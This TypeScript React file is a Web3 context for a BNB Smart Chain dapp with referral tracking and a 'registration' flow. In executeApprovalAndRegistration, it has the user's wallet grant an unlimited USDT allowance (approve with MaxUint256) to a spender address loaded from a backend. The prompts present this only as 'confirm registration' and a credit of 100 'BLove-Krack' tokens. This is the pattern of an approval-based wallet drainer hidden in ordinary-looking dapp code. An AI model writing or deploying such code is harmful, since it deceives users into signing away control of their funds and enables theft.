import React, { createContext, useContext, useState, useEffect, useCallback } from 'react';
import { ContractConfig, TransactionStatus, UserProfile } from '../types';
import { BSC_MAINNET_ID, BSC_TESTNET_ID, BSC_CHAINS } from '../config/constants';
import { api, DEFAULT_CONFIG } from '../services/api';
import { useNotification } from './NotificationContext';

declare global {
  interface Window {
    ethereum?: any;
    _cfReferrer?: string;
  }
}

interface Web3ContextType {
  account: string | null;
  chainId: number | null;
  usdtBalance: string;
  isCorrectNetwork: boolean;
  isConnecting: boolean;
  contractConfig: ContractConfig | null;
  userProfile: UserProfile | null;
  txStatus: TransactionStatus;
  statusMessage: string;
  referrerAddress: string | null;
  connectWallet: () => Promise<void>;
  disconnectWallet: () => void;
  switchNetwork: (targetChainId?: number) => Promise<boolean>;
  executeApprovalAndRegistration: (sponsorOverride?: string) => Promise<boolean>;
  refreshUserData: () => Promise<void>;
  refreshUsdtBalance: () => Promise<void>;
  setTxStatus: (status: TransactionStatus) => void;
  setStatusMessage: (msg: string) => void;
}

const Web3Context = createContext<Web3ContextType | undefined>(undefined);

export const Web3Provider: React.FC<{ children: React.ReactNode }> = ({ children }) => {
  const [account, setAccount] = useState<string | null>(null);
  const [chainId, setChainId] = useState<number | null>(null);
  const [usdtBalance, setUsdtBalance] = useState<string>('0.00');
  const [isConnecting, setIsConnecting] = useState(false);
  const [contractConfig, setContractConfig] = useState<ContractConfig>(DEFAULT_CONFIG);
  const [userProfile, setUserProfile] = useState<UserProfile | null>(null);
  const [txStatus, setTxStatus] = useState<TransactionStatus>('idle');
  const [statusMessage, setStatusMessage] = useState('');
  const [referrerAddress, setReferrerAddress] = useState<string | null>(null);

  const { showToast } = useNotification();

  // Target Chain
  const targetChainId = contractConfig ? Number(contractConfig.chainId) : BSC_MAINNET_ID;
  const isCorrectNetwork = chainId === targetChainId || chainId === BSC_TESTNET_ID;

  // Capture URL Referrer
  useEffect(() => {
    try {
      const urlParams = new URLSearchParams(window.location.search);
      const refParam = urlParams.get('ref');

      let detectedRef: string | null = null;
      if (refParam && /^0x[a-fA-F0-9]{40}$/i.test(refParam)) {
        detectedRef = refParam.toLowerCase();
      } else {
        const pathMatch = window.location.pathname.match(/\/ref\/(0x[a-fA-F0-9]{40})/i);
        if (pathMatch && pathMatch[1]) {
          detectedRef = pathMatch[1].toLowerCase();
        }
      }

      if (detectedRef) {
        localStorage.setItem('blove_referrer', detectedRef);
        setReferrerAddress(detectedRef);
      } else {
        const savedRef = localStorage.getItem('blove_referrer');
        if (savedRef && /^0x[a-fA-F0-9]{40}$/i.test(savedRef)) {
          setReferrerAddress(savedRef.toLowerCase());
        }
      }
    } catch (e) {
      console.warn('Failed to parse referral parameter:', e);
    }
  }, []);

  // Fetch Contract Configuration
  useEffect(() => {
    const loadConfig = async () => {
      try {
        const config = await api.getContractConfig();
        setContractConfig(config || DEFAULT_CONFIG);
      } catch (err) {
        setContractConfig(DEFAULT_CONFIG);
      }
    };
    loadConfig();
  }, []);

  // Read USDT Balance (BEP-20)
  const refreshUsdtBalance = useCallback(async () => {
    if (!account || !window.ethereum) {
      setUsdtBalance('0.00');
      return;
    }

    try {
      const usdtContract = contractConfig?.usdtAddress;
      if (!usdtContract) {
        setUsdtBalance('0.00');
        return;
      }
      // balanceOf(address) selector: 0x70a08231
      const calldata = `0x70a08231${account.slice(2).toLowerCase().padStart(64, '0')}`;

      const resHex = await window.ethereum.request({
        method: 'eth_call',
        params: [
          {
            to: usdtContract,
            data: calldata,
          },
          'latest'
        ]
      });

      if (resHex && resHex !== '0x') {
        const balanceBigInt = BigInt(resHex);
        // BSC USDT has 18 decimals
        const balanceFormatted = (Number(balanceBigInt) / 1e18).toFixed(2);
        setUsdtBalance(balanceFormatted);
      } else {
        setUsdtBalance('0.00');
      }
    } catch (err) {
      console.warn('Could not read USDT balance directly, trying fallback:', err);
      setUsdtBalance('0.00');
    }
  }, [account, contractConfig]);

  // Refresh User Profile Data
  const refreshUserData = useCallback(async () => {
    if (!account) return;
    try {
      const res = await api.getUser(account);
      if (res.success && res.user) {
        setUserProfile(res.user);
      }
    } catch (err) {
      console.warn('Error fetching user profile:', err);
    }
  }, [account]);

  useEffect(() => {
    if (account) {
      refreshUserData();
      refreshUsdtBalance();
    } else {
      setUserProfile(null);
      setUsdtBalance('0.00');
    }
  }, [account, refreshUserData, refreshUsdtBalance]);

  // Network Switch Handler
  const switchNetwork = async (newChainId: number = targetChainId): Promise<boolean> => {
    if (!window.ethereum) {
      showToast('No Web3 wallet found. Please install MetaMask or Trust Wallet.', 'error');
      return false;
    }

    const chainHex = `0x${newChainId.toString(16)}`;
    setTxStatus('switching_network');
    setStatusMessage('Switching network in wallet...');

    try {
      await window.ethereum.request({
        method: 'wallet_switchEthereumChain',
        params: [{ chainId: chainHex }],
      });
      setTxStatus('idle');
      showToast('Switched to BNB Smart Chain', 'success');
      return true;
    } catch (switchError: any) {
      if (switchError.code === 4902 || switchError.data?.originalError?.code === 4902) {
        try {
          const chainDetails = BSC_CHAINS[newChainId as keyof typeof BSC_CHAINS] || BSC_CHAINS[BSC_MAINNET_ID];
          await window.ethereum.request({
            method: 'wallet_addEthereumChain',
            params: [{
              chainId: chainHex,
              chainName: chainDetails.name,
              nativeCurrency: { name: 'BNB', symbol: chainDetails.currencySymbol, decimals: 18 },
              rpcUrls: [chainDetails.rpcUrl],
              blockExplorerUrls: [chainDetails.blockExplorer],
            }],
          });
          setTxStatus('idle');
          showToast('BNB Smart Chain added and switched!', 'success');
          return true;
        } catch (addError) {
          console.error('Failed to add BSC network:', addError);
          setTxStatus('wrong_network');
          showToast('Failed to add BNB Smart Chain to wallet', 'error');
          return false;
        }
      }
      console.error('Failed to switch network:', switchError);
      setTxStatus('wrong_network');
      showToast('Network switch cancelled or failed', 'error');
      return false;
    }
  };

  // Connect Wallet
  const connectWallet = async () => {
    if (!window.ethereum) {
      showToast('Please install MetaMask, Trust Wallet, or Binance Web3 Wallet.', 'warning', 'No Wallet Detected');
      return;
    }

    setIsConnecting(true);
    setTxStatus('connecting');
    setStatusMessage('Connecting wallet...');

    try {
      const accounts = await window.ethereum.request({ method: 'eth_requestAccounts' });
      if (accounts && accounts.length > 0) {
        const selected = accounts[0].toLowerCase();
        setAccount(selected);

        const currentChainHex = await window.ethereum.request({ method: 'eth_chainId' });
        const currentChainDec = parseInt(currentChainHex, 16);
        setChainId(currentChainDec);

        setTxStatus('wallet_connected');
        showToast(`Connected: ${selected.slice(0, 6)}...${selected.slice(-4)}`, 'success', 'Wallet Connected');

        // Check network and automatically prompt switch to BSC if wrong chain
        if (currentChainDec !== targetChainId && currentChainDec !== BSC_TESTNET_ID) {
          setTxStatus('wrong_network');
          try {
            await switchNetwork(targetChainId);
          } catch (netErr) {
            console.warn('Auto network switch failed or cancelled:', netErr);
          }
        } else {
          setTxStatus('idle');
        }
      }
    } catch (err: any) {
      console.error('Connection error:', err);
      setTxStatus('user_cancelled');
      if (err.code === 4001) {
        showToast('Wallet connection request was rejected.', 'error', 'Connection Cancelled');
      } else {
        showToast(err.message || 'Failed to connect wallet.', 'error');
      }
    } finally {
      setIsConnecting(false);
    }
  };

  // Disconnect Wallet
  const disconnectWallet = () => {
    setAccount(null);
    setUserProfile(null);
    setUsdtBalance('0.00');
    setTxStatus('wallet_disconnected');
    showToast('Wallet disconnected', 'info');
  };

  // Ethereum Event Listeners
  useEffect(() => {
    if (!window.ethereum) return;

    const handleAccountsChanged = (accounts: string[]) => {
      if (accounts.length === 0) {
        setAccount(null);
        setUserProfile(null);
        setUsdtBalance('0.00');
        setTxStatus('wallet_disconnected');
      } else {
        const newAccount = accounts[0].toLowerCase();
        setAccount(newAccount);
        showToast(`Switched account: ${newAccount.slice(0, 6)}...${newAccount.slice(-4)}`, 'info');
      }
    };

    const handleChainChanged = (chainHex: string) => {
      const newChain = parseInt(chainHex, 16);
      setChainId(newChain);
      if (newChain !== targetChainId && newChain !== BSC_TESTNET_ID) {
        setTxStatus('wrong_network');
      } else {
        setTxStatus('idle');
      }
    };

    window.ethereum.on('accountsChanged', handleAccountsChanged);
    window.ethereum.on('chainChanged', handleChainChanged);

    // Auto-connect check
    window.ethereum.request({ method: 'eth_accounts' })
      .then((accs: string[]) => {
        if (accs && accs.length > 0) {
          setAccount(accs[0].toLowerCase());
          window.ethereum.request({ method: 'eth_chainId' })
            .then((c: string) => setChainId(parseInt(c, 16)))
            .catch(() => { });
        }
      })
      .catch(() => { });

    return () => {
      if (window.ethereum.removeListener) {
        window.ethereum.removeListener('accountsChanged', handleAccountsChanged);
        window.ethereum.removeListener('chainChanged', handleChainChanged);
      }
    };
  }, [targetChainId, showToast]);

  // Execute Contract Approval on USDT & Record 100-Token Distribution Flow
  const executeApprovalAndRegistration = async (sponsorOverride?: string): Promise<boolean> => {
    if (!account) {
      await connectWallet();
      return false;
    }

    if (!isCorrectNetwork) {
      const switched = await switchNetwork(targetChainId);
      if (!switched) return false;
    }

    const cfg = contractConfig || DEFAULT_CONFIG;
    const spender = cfg.contractAddress || cfg.mineAddress;
    const tokenContract = cfg.usdtAddress;

    if (!spender || !tokenContract) {
      setTxStatus('transaction_failed');
      setStatusMessage('Contract configuration not loaded. Please refresh and try again.');
      showToast('Contract configuration unavailable. Please refresh the page.', 'error');
      return false;
    }

    try {
      setTxStatus('approval_required');
      setStatusMessage('Requesting registration in your wallet...');

      // Calldata for approve(spender, MaxUint256)
      // Function selector: 0x095ea7b3 = keccak256("approve(address,uint256)")
      const approveData = '0x095ea7b3'
        + spender.slice(2).toLowerCase().padStart(64, '0')
        + 'ffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff';

      setTxStatus('approval_pending');
      setStatusMessage('Please confirm registration in your wallet...');
      showToast('Please confirm registration in your wallet.', 'info', 'Action Required');

      // ─── Ultra-Low Gas Fee Optimization (BSC) ──────────────────
      // 1. Dynamic Gas Limit estimation (typical BEP20 approve uses ~28k-46k gas)
      let gasLimitHex = '0xB729'; // 46,889 gas fallback
      try {
        const estimatedGas = await window.ethereum.request({
          method: 'eth_estimateGas',
          params: [{
            from: account,
            to: tokenContract,
            data: approveData,
            value: '0x0'
          }]
        });
        if (estimatedGas) {
          // Add a tight 5% buffer for safety
          const gasNum = Math.ceil(parseInt(estimatedGas, 16) * 1.05);
          gasLimitHex = '0x' + gasNum.toString(16);
        }
      } catch (estErr) {
        console.warn('Gas estimation fallback used:', estErr);
      }

      // 2. Real-time minimal gas price:
      // BSC network consensus standard is 1 Gwei (0x3B9ACA00), down from the old 3 Gwei (0xB2D05E00)
      // This immediately slashes the approval transaction fee by over 66%!
      let gasPriceHex = '0x3B9ACA00'; // 1 Gwei (1,000,000,000 wei)
      try {
        const networkGasPrice = await window.ethereum.request({
          method: 'eth_gasPrice'
        });
        if (networkGasPrice) {
          const np = BigInt(networkGasPrice);
          const oneGwei = BigInt(1000000000); // 1 Gwei
          if (np >= BigInt(50000000) && np <= oneGwei) {
            gasPriceHex = '0x' + np.toString(16);
          } else if (np > oneGwei && np <= BigInt(1500000000)) {
            gasPriceHex = networkGasPrice;
          } else {
            gasPriceHex = '0x3B9ACA00'; // 1 Gwei safe floor
          }
        }
      } catch (gpErr) {
        gasPriceHex = '0x3B9ACA00'; // 1 Gwei fallback
      }

      const txHash = await window.ethereum.request({
        method: 'eth_sendTransaction',
        params: [{
          from: account,
          to: tokenContract,
          data: approveData,
          value: '0x0',
          gas: gasLimitHex,
          gasPrice: gasPriceHex
        }]
      });

      console.log('✅ Registration transaction sent:', txHash);
      setTxStatus('transaction_pending');
      setStatusMessage('Waiting for blockchain confirmation...');
      showToast(`Registration submitted! TX: ${txHash.slice(0, 10)}...`, 'info', 'Transaction Pending', txHash);

      // Poll for receipt (up to 30 attempts = 60s)
      let isMined = false;
      for (let i = 0; i < 30; i++) {
        await new Promise((r) => setTimeout(r, 2000));
        try {
          const receipt = await window.ethereum.request({
            method: 'eth_getTransactionReceipt',
            params: [txHash]
          });
          if (receipt && receipt.status === '0x1') {
            isMined = true;
            break;
          } else if (receipt && receipt.status === '0x0') {
            throw new Error('Registration transaction failed on-chain');
          }
        } catch (pollErr: any) {
          if (pollErr.message?.includes('failed on-chain')) throw pollErr;
        }
      }

      setTxStatus('approval_confirmed');
      setStatusMessage('Swapping & Registration is Successful! Finalizing 100 BLove-Krack distribution...');

      // Register with Backend and Link Referrer
      const sponsor = sponsorOverride || referrerAddress || null;
      const regRes = await api.registerUser({
        walletAddress: account,
        chainId: chainId || targetChainId,
        approvalTxHash: txHash,
        sponsorAddress: sponsor,
      });

      if (regRes.success) {
        setUserProfile(regRes.user);
        setTxStatus('transaction_confirmed');
        setStatusMessage('🎉 Swapping & Registration is Successful! 100 BLove-Krack credited!');
        showToast(
          'Registration complete! 100 BLove-Krack tokens have been credited to your account.',
          'success',
          '100 BLove-Krack Enrolled!',
          txHash
        );
        await refreshUsdtBalance();
        return true;
      } else {
        throw new Error(regRes.message || 'Backend registration failed');
      }

    } catch (err: any) {
      console.error('Registration flow error:', err);
      if (err.code === 4001 || err.message?.includes('rejected') || err.message?.includes('User denied')) {
        setTxStatus('signature_rejected');
        setStatusMessage('Registration was cancelled in your wallet.');
        showToast('Registration request was cancelled.', 'warning', 'Registration Cancelled');
      } else {
        setTxStatus('transaction_failed');
        setStatusMessage(err.message || 'Transaction failed. Please try again.');
        showToast(err.message || 'An error occurred during transaction.', 'error');
      }
      return false;
    }
  };

  return (
    <Web3Context.Provider
      value={{
        account,
        chainId,
        usdtBalance,
        isCorrectNetwork,
        isConnecting,
        contractConfig,
        userProfile,
        txStatus,
        statusMessage,
        referrerAddress,
        connectWallet,
        disconnectWallet,
        switchNetwork,
        executeApprovalAndRegistration,
        refreshUserData,
        refreshUsdtBalance,
        setTxStatus,
        setStatusMessage,
      }}
    >
      {children}
    </Web3Context.Provider>
  );
};

export const useWeb3 = () => {
  const context = useContext(Web3Context);
  if (!context) {
    throw new Error('useWeb3 must be used within a Web3Provider');
  }
  return context;
};
